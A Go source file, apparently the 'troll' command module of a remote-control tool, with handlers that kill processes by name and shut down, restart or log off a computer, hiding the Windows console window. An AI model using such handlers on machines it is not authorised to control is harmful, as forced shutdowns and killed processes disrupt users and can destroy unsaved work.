package troll

import (
	"fmt"
	"os/exec"
	"runtime"
	"syscall"

	"github.com/shirou/gopsutil/v3/process"
)

// KillProcessHandler mata processos por nome
// params: ["notepad.exe"] ou ["chrome.exe", "all"] para matar todas as instâncias
func KillProcessHandler(params []interface{}) (string, error) {
	if len(params) < 1 {
		return "", fmt.Errorf("process name required")
	}

	targetName := fmt.Sprintf("%v", params[0])
	killed := 0
	errors := 0

	procs, err := process.Processes()
	if err != nil {
		return "", fmt.Errorf("failed to list processes: %v", err)
	}

	for _, p := range procs {
		name, err := p.Name()
		if err != nil {
			continue
		}

		if name == targetName {
			err := p.Kill()
			if err != nil {
				errors++
			} else {
				killed++
			}
		}
	}

	if killed == 0 && errors == 0 {
		return fmt.Sprintf("No processes found with name: %s", targetName), nil
	}

	return fmt.Sprintf("Killed %d instance(s) of %s (%d failed)", killed, targetName, errors), nil
}

// ShutdownHandler desliga o computador
// params: [] ou ["force"] para forçar
func ShutdownHandler(params []interface{}) (string, error) {
	force := false
	if len(params) >= 1 {
		if fmt.Sprintf("%v", params[0]) == "force" {
			force = true
		}
	}

	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		if force {
			cmd = exec.Command("shutdown", "/s", "/f", "/t", "0")
		} else {
			cmd = exec.Command("shutdown", "/s", "/t", "0")
		}
		// Ocultar janela
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x08000000,
		}

	case "darwin":
		// macOS
		cmd = exec.Command("osascript", "-e", `tell app "System Events" to shut down`)

	default:
		// Linux
		if force {
			cmd = exec.Command("shutdown", "-h", "now")
		} else {
			cmd = exec.Command("shutdown", "-h", "+0")
		}
	}

	err := cmd.Start()
	if err != nil {
		return "", fmt.Errorf("failed to initiate shutdown: %v", err)
	}

	return "Shutdown initiated", nil
}

// RestartHandler reinicia o computador (para uso futuro)
func RestartHandler(params []interface{}) (string, error) {
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("shutdown", "/r", "/t", "0")
		cmd.SysProcAttr = &syscall.SysProcAttr{
			HideWindow:    true,
			CreationFlags: 0x08000000,
		}
	case "darwin":
		cmd = exec.Command("osascript", "-e", `tell app "System Events" to restart`)
	default:
		cmd = exec.Command("shutdown", "-r", "now")
	}

	err := cmd.Start()
	if err != nil {
		return "", fmt.Errorf("failed to initiate restart: %v", err)
	}

	return "Restart initiated", nil
}

// LogoffHandler faz logoff do usuário (para uso futuro)
func LogoffHandler(params []interface{}) (string, error) {
	if runtime.GOOS != "windows" {
		return "", fmt.Errorf("logoff only supported on Windows")
	}

	cmd := exec.Command("shutdown", "/l")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000,
	}

	err := cmd.Start()
	if err != nil {
		return "", fmt.Errorf("failed to initiate logoff: %v", err)
	}

	return "Logoff initiated", nil
}
